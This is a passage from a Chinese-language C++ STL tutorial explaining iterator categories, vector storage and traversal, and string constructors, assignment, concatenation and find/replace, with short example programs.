<p>有限的步骤，解决逻辑或数学上的问题，这一门学科我们叫做算法(Algorithms)</p>
<p>算法分为:<strong>质变算法</strong>和<strong>非质变算法</strong>。</p>
<p>质变算法：是指运算过程中会更改区间内的元素的内容。例如拷贝，替换，删除等等</p>
<p>非质变算法：是指运算过程中不会更改区间内的元素内容，例如查找、计数、遍历、寻找极值等等</p>
<p><strong>迭代器：</strong>容器和算法之间粘合剂</p>
<p>提供一种方法，使之能够依序寻访某个容器所含的各个元素，而又无需暴露该容器的内部表示方式。</p>
<p>每个容器都有自己专属的迭代器</p>
<p>迭代器使用非常类似于指针，初学阶段我们可以先理解迭代器为指针</p>
<p>迭代器种类：</p>
<table>
<thead>
<tr>
<th>种类</th>
<th>功能</th>
<th>支持运算</th>
</tr>
</thead>
<tbody><tr>
<td>输入迭代器</td>
<td>对数据的只读访问</td>
<td>只读，支持++、&#x3D;&#x3D;、！&#x3D;</td>
</tr>
<tr>
<td>输出迭代器</td>
<td>对数据的只写访问</td>
<td>只写，支持++</td>
</tr>
<tr>
<td>前向迭代器</td>
<td>读写操作，并能向前推进迭代器</td>
<td>读写，支持++、&#x3D;&#x3D;、！&#x3D;</td>
</tr>
<tr>
<td>双向迭代器</td>
<td>读写操作，并能向前和向后操作</td>
<td>读写，支持++、–，</td>
</tr>
<tr>
<td>随机访问迭代器</td>
<td>读写操作，可以以跳跃的方式访问任意数据，功能最强的迭代器</td>
<td>读写，支持++、–、[n]、-n、&lt;、&lt;&#x3D;、&gt;、&gt;&#x3D;</td>
</tr>
</tbody></table>
<p>常用的容器中迭代器种类为双向迭代器，和随机访问迭代器</p>
<h3 id="2-5-容器算法迭代器初识"><a href="#2-5-容器算法迭代器初识" class="headerlink" title="2.5 容器算法迭代器初识"></a>2.5 容器算法迭代器初识</h3><p>了解STL中容器、算法、迭代器概念之后，我们利用代码感受STL的魅力</p>
<p>STL中最常用的容器为Vector，可以理解为数组，下面我们将学习如何向这个容器中插入数据、并遍历这个容器</p>
<h4 id="2-5-1-vector存放内置数据类型"><a href="#2-5-1-vector存放内置数据类型" class="headerlink" title="2.5.1 vector存放内置数据类型"></a>2.5.1 vector存放内置数据类型</h4><p>容器：     <code>vector</code></p>
<p>算法：     <code>for_each</code></p>
<p>迭代器： <code>vector&lt;int&gt;::iterator</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyPrint</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; val &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建vector容器对象，并且通过模板参数指定容器中存放的数据的类型</span></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	<span class="comment">//向容器中放数据</span></span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//每一个容器都有自己的迭代器，迭代器是用来遍历容器中的元素</span></span><br><span class="line">	<span class="comment">//v.begin()返回迭代器，这个迭代器指向容器中第一个数据</span></span><br><span class="line">	<span class="comment">//v.end()返回迭代器，这个迭代器指向容器元素的最后一个元素的下一个位置</span></span><br><span class="line">	<span class="comment">//vector&lt;int&gt;::iterator 拿到vector&lt;int&gt;这种容器的迭代器类型</span></span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;::iterator pBegin = v.<span class="built_in">begin</span>();</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;::iterator pEnd = v.<span class="built_in">end</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//第一种遍历方式：</span></span><br><span class="line">	<span class="keyword">while</span> (pBegin != pEnd) &#123;</span><br><span class="line">		cout &lt;&lt; *pBegin &lt;&lt; endl;</span><br><span class="line">		pBegin++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//第二种遍历方式：</span></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//第三种遍历方式：</span></span><br><span class="line">	<span class="comment">//使用STL提供标准遍历算法  头文件 algorithm</span></span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), MyPrint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="2-5-2-Vector存放自定义数据类型"><a href="#2-5-2-Vector存放自定义数据类型" class="headerlink" title="2.5.2 Vector存放自定义数据类型"></a>2.5.2 Vector存放自定义数据类型</h4><p>学习目标：vector中存放自定义数据类型，并打印输出</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义数据类型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age) &#123;</span><br><span class="line">		mName = name;</span><br><span class="line">		mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string mName;</span><br><span class="line">	<span class="type">int</span> mAge;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//存放对象</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;Person&gt; v;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建数据</span></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;aaa&quot;</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;bbb&quot;</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;ccc&quot;</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;ddd&quot;</span>, <span class="number">40</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p5</span><span class="params">(<span class="string">&quot;eee&quot;</span>, <span class="number">50</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	v.<span class="built_in">push_back</span>(p1);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p2);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p3);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p4);</span><br><span class="line">	v.<span class="built_in">push_back</span>(p5);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;Person&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Name:&quot;</span> &lt;&lt; (*it).mName &lt;&lt; <span class="string">&quot; Age:&quot;</span> &lt;&lt; (*it).mAge &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//放对象指针</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;Person*&gt; v;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建数据</span></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;aaa&quot;</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;bbb&quot;</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;ccc&quot;</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;ddd&quot;</span>, <span class="number">40</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p5</span><span class="params">(<span class="string">&quot;eee&quot;</span>, <span class="number">50</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	v.<span class="built_in">push_back</span>(&amp;p1);</span><br><span class="line">	v.<span class="built_in">push_back</span>(&amp;p2);</span><br><span class="line">	v.<span class="built_in">push_back</span>(&amp;p3);</span><br><span class="line">	v.<span class="built_in">push_back</span>(&amp;p4);</span><br><span class="line">	v.<span class="built_in">push_back</span>(&amp;p5);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;Person*&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		Person * p = (*it);</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Name:&quot;</span> &lt;&lt; p-&gt;mName &lt;&lt; <span class="string">&quot; Age:&quot;</span> &lt;&lt; (*it)-&gt;mAge &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="2-5-3-Vector容器嵌套容器"><a href="#2-5-3-Vector容器嵌套容器" class="headerlink" title="2.5.3 Vector容器嵌套容器"></a>2.5.3 Vector容器嵌套容器</h4><p>学习目标：容器中嵌套容器，我们将所有数据进行遍历输出</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//容器嵌套容器</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt; vector&lt;<span class="type">int</span>&gt; &gt;  v;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v2;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v3;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v4;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i + <span class="number">1</span>);</span><br><span class="line">		v<span class="number">2.</span><span class="built_in">push_back</span>(i + <span class="number">2</span>);</span><br><span class="line">		v<span class="number">3.</span><span class="built_in">push_back</span>(i + <span class="number">3</span>);</span><br><span class="line">		v<span class="number">4.</span><span class="built_in">push_back</span>(i + <span class="number">4</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将容器元素插入到vector v中</span></span><br><span class="line">	v.<span class="built_in">push_back</span>(v1);</span><br><span class="line">	v.<span class="built_in">push_back</span>(v2);</span><br><span class="line">	v.<span class="built_in">push_back</span>(v3);</span><br><span class="line">	v.<span class="built_in">push_back</span>(v4);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator vit = (*it).<span class="built_in">begin</span>(); vit != (*it).<span class="built_in">end</span>(); vit++) &#123;</span><br><span class="line">			cout &lt;&lt; *vit &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="3-STL-常用容器"><a href="#3-STL-常用容器" class="headerlink" title="3 STL- 常用容器"></a>3 STL- 常用容器</h2><h3 id="3-1-string容器"><a href="#3-1-string容器" class="headerlink" title="3.1 string容器"></a>3.1 string容器</h3><h4 id="3-1-1-string基本概念"><a href="#3-1-1-string基本概念" class="headerlink" title="3.1.1 string基本概念"></a>3.1.1 string基本概念</h4><p><strong>本质：</strong></p>
<ul>
<li>string是C++风格的字符串，而string本质上是一个类</li>
</ul>
<p><strong>string和char * 区别：</strong></p>
<ul>
<li>char * 是一个指针</li>
<li>string是一个类，类内部封装了char*，管理这个字符串，是一个char*型的容器。</li>
</ul>
<p><strong>特点：</strong></p>
<p>string 类内部封装了很多成员方法</p>
<p>例如：查找find，拷贝copy，删除delete 替换replace，插入insert</p>
<p>string管理char*所分配的内存，不用担心复制越界和取值越界等，由类内部进行负责</p>
<h4 id="3-1-2-string构造函数"><a href="#3-1-2-string构造函数" class="headerlink" title="3.1.2 string构造函数"></a>3.1.2 string构造函数</h4><p>构造函数原型：</p>
<ul>
<li><code>string();</code>          				&#x2F;&#x2F;创建一个空的字符串 例如: string str;<br>   <code>string(const char* s);</code>	        &#x2F;&#x2F;使用字符串s初始化</li>
<li><code>string(const string&amp; str);</code>    &#x2F;&#x2F;使用一个string对象初始化另一个string对象</li>
<li><code>string(int n, char c);</code>           &#x2F;&#x2F;使用n个字符c初始化</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="comment">//string构造</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string s1; <span class="comment">//创建空字符串，调用无参构造函数</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str1 = &quot;</span> &lt;&lt; s1 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>* str = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	<span class="function">string <span class="title">s2</span><span class="params">(str)</span></span>; <span class="comment">//把c_string转换成了string</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str2 = &quot;</span> &lt;&lt; s2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="function">string <span class="title">s3</span><span class="params">(s2)</span></span>; <span class="comment">//调用拷贝构造函数</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str3 = &quot;</span> &lt;&lt; s3 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="function">string <span class="title">s4</span><span class="params">(<span class="number">10</span>, <span class="string">&#x27;a&#x27;</span>)</span></span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str3 = &quot;</span> &lt;&lt; s3 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：string的多种构造方式没有可比性，灵活使用即可</p>
<h4 id="3-1-3-string赋值操作"><a href="#3-1-3-string赋值操作" class="headerlink" title="3.1.3 string赋值操作"></a>3.1.3 string赋值操作</h4><p>功能描述：</p>
<ul>
<li>给string字符串进行赋值</li>
</ul>
<p>赋值的函数原型：</p>
<ul>
<li><code>string&amp; operator=(const char* s);</code>             &#x2F;&#x2F;char*类型字符串 赋值给当前的字符串</li>
<li><code>string&amp; operator=(const string &amp;s);</code>         &#x2F;&#x2F;把字符串s赋给当前的字符串</li>
<li><code>string&amp; operator=(char c);</code>                          &#x2F;&#x2F;字符赋值给当前的字符串</li>
<li><code>string&amp; assign(const char *s);</code>                  &#x2F;&#x2F;把字符串s赋给当前的字符串</li>
<li><code>string&amp; assign(const char *s, int n);</code>     &#x2F;&#x2F;把字符串s的前n个字符赋给当前的字符串</li>
<li><code>string&amp; assign(const string &amp;s);</code>              &#x2F;&#x2F;把字符串s赋给当前字符串</li>
<li><code>string&amp; assign(int n, char c);</code>                  &#x2F;&#x2F;用n个字符c赋给当前字符串</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//赋值</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string str1;</span><br><span class="line">	str1 = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str1 = &quot;</span> &lt;&lt; str1 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	string str2;</span><br><span class="line">	str2 = str1;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str2 = &quot;</span> &lt;&lt; str2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	string str3;</span><br><span class="line">	str3 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str3 = &quot;</span> &lt;&lt; str3 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	string str4;</span><br><span class="line">	str<span class="number">4.</span><span class="built_in">assign</span>(<span class="string">&quot;hello c++&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str4 = &quot;</span> &lt;&lt; str4 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	string str5;</span><br><span class="line">	str<span class="number">5.</span><span class="built_in">assign</span>(<span class="string">&quot;hello c++&quot;</span>,<span class="number">5</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str5 = &quot;</span> &lt;&lt; str5 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	string str6;</span><br><span class="line">	str<span class="number">6.</span><span class="built_in">assign</span>(str5);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str6 = &quot;</span> &lt;&lt; str6 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	string str7;</span><br><span class="line">	str<span class="number">7.</span><span class="built_in">assign</span>(<span class="number">5</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str7 = &quot;</span> &lt;&lt; str7 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<p>​	string的赋值方式很多，<code>operator=</code>  这种方式是比较实用的</p>
<h4 id="3-1-4-string字符串拼接"><a href="#3-1-4-string字符串拼接" class="headerlink" title="3.1.4 string字符串拼接"></a>3.1.4 string字符串拼接</h4><p><strong>功能描述：</strong></p>
<ul>
<li>实现在字符串末尾拼接字符串</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>string&amp; operator+=(const char* str);</code>                   &#x2F;&#x2F;重载+&#x3D;操作符</li>
<li><code>string&amp; operator+=(const char c);</code>                         &#x2F;&#x2F;重载+&#x3D;操作符</li>
<li><code>string&amp; operator+=(const string&amp; str);</code>                &#x2F;&#x2F;重载+&#x3D;操作符</li>
<li><code>string&amp; append(const char *s); </code>                               &#x2F;&#x2F;把字符串s连接到当前字符串结尾</li>
<li><code>string&amp; append(const char *s, int n);</code>                 &#x2F;&#x2F;把字符串s的前n个字符连接到当前字符串结尾</li>
<li><code>string&amp; append(const string &amp;s);</code>                           &#x2F;&#x2F;同operator+&#x3D;(const string&amp; str)</li>
<li><code>string&amp; append(const string &amp;s, int pos, int n);</code>&#x2F;&#x2F;字符串s中从pos开始的n个字符连接到字符串结尾</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//字符串拼接</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string str1 = <span class="string">&quot;我&quot;</span>;</span><br><span class="line"></span><br><span class="line">	str1 += <span class="string">&quot;爱玩游戏&quot;</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str1 = &quot;</span> &lt;&lt; str1 &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	str1 += <span class="string">&#x27;:&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str1 = &quot;</span> &lt;&lt; str1 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	string str2 = <span class="string">&quot;LOL DNF&quot;</span>;</span><br><span class="line"></span><br><span class="line">	str1 += str2;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str1 = &quot;</span> &lt;&lt; str1 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	string str3 = <span class="string">&quot;I&quot;</span>;</span><br><span class="line">	str<span class="number">3.</span><span class="built_in">append</span>(<span class="string">&quot; love &quot;</span>);</span><br><span class="line">	str<span class="number">3.</span><span class="built_in">append</span>(<span class="string">&quot;game abcde&quot;</span>, <span class="number">4</span>);</span><br><span class="line">	<span class="comment">//str3.append(str2);</span></span><br><span class="line">	str<span class="number">3.</span><span class="built_in">append</span>(str2, <span class="number">4</span>, <span class="number">3</span>); <span class="comment">// 从下标4位置开始 ，截取3个字符，拼接到字符串末尾</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str3 = &quot;</span> &lt;&lt; str3 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：字符串拼接的重载版本很多，初学阶段记住几种即可</p>
<h4 id="3-1-5-string查找和替换"><a href="#3-1-5-string查找和替换" class="headerlink" title="3.1.5 string查找和替换"></a>3.1.5 string查找和替换</h4><p><strong>功能描述：</strong></p>
<ul>
<li>查找：查找指定字符串是否存在</li>
<li>替换：在指定的位置替换字符串</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>int find(const string&amp; str, int pos = 0) const;</code>              &#x2F;&#x2F;查找str第一次出现位置,从pos开始查找</li>
<li><code>int find(const char* s, int pos = 0) const; </code>                     &#x2F;&#x2F;查找s第一次出现位置,从pos开始查找</li>
<li><code>int find(const char* s, int pos, int n) const; </code>               &#x2F;&#x2F;从pos位置查找s的前n个字符第一次位置</li>
<li><code>int find(const char c, int pos = 0) const; </code>                       &#x2F;&#x2F;查找字符c第一次出现位置</li>
<li><code>int rfind(const string&amp; str, int pos = npos) const;</code>      &#x2F;&#x2F;查找str最后一次位置,从pos开始查找</li>
<li><code>int rfind(const char* s, int pos = npos) const;</code>              &#x2F;&#x2F;查找s最后一次出现位置,从pos开始查找</li>
<li><code>int rfind(const char* s, int pos, int n) const;</code>              &#x2F;&#x2F;从pos查找s的前n个字符最后一次位置</li>
<li><code>int rfind(const char c, int pos = 0) const;  </code>                      &#x2F;&#x2F;查找字符c最后一次出现位置</li>
<li><code>string&amp; replace(int pos, int n, const string&amp; str); </code>       &#x2F;&#x2F;替换从pos开始n个字符为字符串str</li>
<li><code>string&amp; replace(int pos, int n,const char* s); </code>                 &#x2F;&#x2F;替换从pos开始的n个字符为字符串s</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查找和替换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//查找</span></span><br><span class="line">	string str1 = <span class="string">&quot;abcdefgde&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> pos = str<span class="number">1.f</span>ind(<span class="string">&quot;de&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pos == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;未找到&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;pos = &quot;</span> &lt;&lt; pos &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	pos = str<span class="number">1.</span><span class="built_in">rfind</span>(<span class="string">&quot;de&quot;</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;pos = &quot;</span> &lt;&lt; pos &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//替换</span></span><br><span class="line">	string str1 = <span class="string">&quot;abcdefgde&quot;</span>;</span><br><span class="line">	str<span class="number">1.</span><span class="built_in">replace</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="string">&quot;1111&quot;</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;str1 = &quot;</span> &lt;&lt; str1 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>find查找是从左往后，rfind从右往左</li>
<li>find找到字符串后返回查找的第一个字符位置，找不到返回-1</li>
<li>replace在替换时，要指定从哪个位置起，多少个字符，替换成什么样的字符串</li>
</ul>
<h4 id="3-1-6-string字符串比较"><a href="#3-1-6-string字符串比较" class="headerlink" title="3.1.6 string字符串比较"></a>3.1.6 string字符串比较</h4><p><strong>功能描述：</strong></p>
<ul>
